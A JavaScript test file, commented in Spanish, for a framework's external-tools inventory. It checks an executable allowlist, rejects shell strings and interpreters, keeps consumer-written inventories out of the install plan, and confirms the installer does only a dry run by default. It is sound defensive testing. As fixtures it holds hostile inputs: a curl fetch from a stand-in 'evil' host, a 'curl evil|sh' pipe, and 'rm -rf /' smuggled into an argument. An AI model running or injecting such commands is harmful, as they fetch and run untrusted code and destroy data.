// ---------------------------------------------------------------------------
// Inventario de herramientas externas (ADR 0007).
//
// `tools-doctor` sabia detectar nueve herramientas y decir `missing`/`warning`
// con una ruta. Lo que el usuario que instala necesita —que es esto, si me
// hace falta, como la consigo— vivia en prosa, en otro documento. Aqui se
// prueba que ese conocimiento llega al comando, y sobre todo que el camino de
// EJECUCION es seguro: un inventario es una superficie de ejecucion.
// ---------------------------------------------------------------------------
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import YAML from "yaml";
import { loadExternalTools, buildInstallPlan, runInstallPlan, ALLOWED_EXECUTABLES_LIST } from "../src/external-tools.js";

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const cli = path.join(repoRoot, "bin", "sdlc.js");

// --- el inventario que entrega el framework es valido -----------------------
const shipped = loadExternalTools(repoRoot);
assert.equal(shipped.ok, true, JSON.stringify(shipped.errors ?? shipped));
assert.ok(shipped.tools.length >= 8);
for (const tool of shipped.tools) {
  assert.ok(tool.id, "toda herramienta necesita id");
  assert.ok(tool.purpose, `${tool.id}: sin 'purpose' el usuario no puede decidir si la necesita`);
  assert.ok(
    tool.install?.argv || tool.manual,
    `${tool.id}: o hay comando automatizable o hay instruccion manual; dejar ambos vacios es prometer nada`
  );
}

console.log("external-tools inventario: PASS");

// --- SEGURIDAD: la allowlist se aplica AL CARGAR, no al ejecutar ------------
// Un inventario invalido no puede llegar nunca a la fase de correr comandos.
function writeInventory(dir, tools) {
  fs.writeFileSync(path.join(dir, "external-tools.yaml"), YAML.stringify({ version: 1, tools }), "utf8");
}

{
  const evil = fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-tools-evil-"));
  writeInventory(evil, [{ id: "malo", purpose: "x", install: { argv: ["curl", "http://evil/x.sh"] } }]);
  const loaded = loadExternalTools(evil);
  assert.equal(loaded.ok, false, "un ejecutable fuera de la allowlist tiene que rechazarse");
  assert.equal(loaded.code, "external-tools-invalid");
  assert.ok(loaded.errors.some((e) => e.includes("allowlist")));
  assert.deepEqual(loaded.tools, [], "un inventario invalido no expone herramientas");
}

{
  // Cadena de shell en vez de lista: el vector clasico. Se rechaza por forma,
  // sin necesidad de inspeccionar el contenido.
  const shellString = fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-tools-shell-"));
  writeInventory(shellString, [{ id: "malo", purpose: "x", install: { argv: "npm install -g x && curl evil|sh" } }]);
  const loaded = loadExternalTools(shellString);
  assert.equal(loaded.ok, false);
  assert.ok(loaded.errors.some((e) => e.includes("argv")));
}

{
  // Metacaracteres DENTRO de un argv permitido: no hay shell, asi que son
  // argumentos literales y el argv no se aplana en una linea.
  const meta = fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-tools-meta-"));
  writeInventory(meta, [{ id: "raro", purpose: "x", install: { argv: ["npm", "install", "-g", "pkg; rm -rf /"] } }]);
  const loaded = loadExternalTools(meta);
  assert.equal(loaded.ok, true, "el argv es valido en forma: el token raro es un ARGUMENTO, no un comando");
  assert.deepEqual(loaded.tools[0].install.argv, ["npm", "install", "-g", "pkg; rm -rf /"], "viaja como lista");
}

// --- EL INVENTARIO DEL CONSUMIDOR NO DECIDE QUE SE EJECUTA ------------------
// `external-tools.yaml` no esta en las rutas que el guard de frontera protege,
// asi que un PR podia declarar su propio comando y esperar a que alguien
// corriera `tools-install --apply`. Un archivo que el evaluado escribe puede
// DESCRIBIR herramientas; no puede decidir que corre en la maquina de quien lo
// revisa. El plan de ejecucion lee siempre el inventario del framework.
{
  const hostile = fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-tools-hostile-"));
  writeInventory(hostile, [{ id: "propia-del-consumidor", purpose: "x", install: { argv: ["npm", "install", "-g", "paquete-del-atacante"] } }]);

  const plan = buildInstallPlan(hostile, { detected: new Map() });
  assert.equal(plan.ok, true);
  const ids = [...plan.installable, ...plan.manualOnly, ...plan.satisfied].map((entry) => entry.id);
  assert.ok(
    !ids.includes("propia-del-consumidor"),
    "una herramienta declarada por el consumidor no puede entrar al plan de ejecucion"
  );
  assert.ok(ids.includes("openspec"), "el plan sale del inventario del framework");
}

// --- UNA ALLOWLIST DE INTERPRETES NO ES UNA ALLOWLIST -----------------------
// `pwsh -File x.ps1` y `node x.js` pasaban el filtro de argv[0] y ejecutaban
// codigo arbitrario del repo: filtrar el ejecutable solo sirve si ese
// ejecutable no puede convertirse en "corre este archivo".
{
  const interpreter = fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-tools-interp-"));
  for (const argv of [["pwsh", "-File", "scripts/lo-que-sea.ps1"], ["node", "scripts/lo-que-sea.js"]]) {
    writeInventory(interpreter, [{ id: "x", purpose: "y", install: { argv } }]);
    const loaded = loadExternalTools(interpreter);
    assert.equal(loaded.ok, false, `'${argv[0]}' es un interprete: no puede estar en la allowlist`);
    assert.ok(loaded.errors.some((e) => e.includes("allowlist")));
  }
  assert.ok(!ALLOWED_EXECUTABLES_LIST.includes("pwsh"));
  assert.ok(!ALLOWED_EXECUTABLES_LIST.includes("node"));
}

console.log("external-tools inventario del consumidor no ejecuta: PASS");

console.log("external-tools allowlist y forma de comando: PASS");

// --- el plan separa lo automatizable de lo manual y de lo ya presente -------
{
  // Se usa el inventario REAL del framework, que es el unico que alimenta la
  // ejecucion. `openspec` trae comando; `gh` es manual; lo detectado como `ok`
  // sale del plan.
  const target = fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-tools-plan-"));
  const plan = buildInstallPlan(target, { detected: new Map([["openspec", "ok"]]) });
  assert.ok(plan.installable.some((e) => e.id === "graphify"), "con comando y ausente -> instalable");
  assert.ok(plan.manualOnly.some((e) => e.id === "gh"), "sin comando automatizable -> manual, con su repo");
  assert.ok(plan.satisfied.some((e) => e.id === "openspec"), "lo ya presente sale del plan");
  assert.ok(
    plan.manualOnly.find((e) => e.id === "gh").repo,
    "una herramienta manual tiene que decir DONDE conseguirla: el repo es la instruccion"
  );
  assert.ok(
    !plan.installable.some((e) => e.id === "autoskills"),
    "autoskills paso a manual: automatizarla exigia un interprete en la allowlist"
  );

  // DRY-RUN: no se ejecuta nada sin `apply`. Instalar software de terceros no
  // puede ser un efecto secundario de pedir un diagnostico.
  const dry = runInstallPlan(target, plan, { apply: false });
  assert.equal(dry.applied, false);
  assert.ok(dry.results.every((r) => r.status === "dry-run"));

  // --tool acota, y un id inexistente es error explicito en vez de plan vacio
  // (un plan vacio se ve igual que "no falta nada").
  assert.deepEqual(buildInstallPlan(target, { detected: new Map(), only: "graphify" }).installable.map((e) => e.id), ["graphify"]);
  const unknown = buildInstallPlan(target, { detected: new Map(), only: "no-existe" });
  assert.equal(unknown.ok, false);
  assert.equal(unknown.code, "external-tool-unknown");
}

console.log("external-tools plan: PASS");

// --- E2E: el CLI es dry-run por defecto -------------------------------------
{
  const target = fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-tools-cli-"));
  fs.writeFileSync(path.join(target, "package.json"), JSON.stringify({ name: "demo" }, null, 2), "utf8");
  const out = JSON.parse(execFileSync("node", [cli, "tools-install", "--target", target, "--json"], { cwd: repoRoot, encoding: "utf8" }));
  assert.equal(out.status, "ok");
  assert.equal(out.applied, false, "sin --apply no se ejecuta nada");
  assert.match(out.hint, /dry-run/);
  assert.ok(Array.isArray(out.installable) && Array.isArray(out.manualOnly));
}

// --- tools-doctor ahora dice QUE es y COMO conseguirla ----------------------
{
  const target = fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-tools-doctor-"));
  fs.writeFileSync(path.join(target, "package.json"), JSON.stringify({ name: "demo" }, null, 2), "utf8");
  const run = spawnSync("node", [cli, "tools-doctor", "--target", target, "--json"], { cwd: repoRoot, encoding: "utf8" });
  const payload = JSON.parse(run.stdout);
  const enriched = (payload.findings ?? []).filter((f) => f.purpose);
  assert.ok(enriched.length > 0, "los hallazgos tienen que traer el proposito, no solo 'missing'");
  for (const finding of enriched) {
    assert.ok(finding.hint, `${finding.code}: un hallazgo sin 'hint' deja al usuario igual que antes`);
    assert.ok(
      finding.install || finding.manual,
      `${finding.code}: o se dice el comando o se dice que el paso es manual`
    );
  }
}

console.log("external-tools cli e2e: PASS");
console.log(`external-tools allowlist declarada: ${ALLOWED_EXECUTABLES_LIST.join(", ")}`);
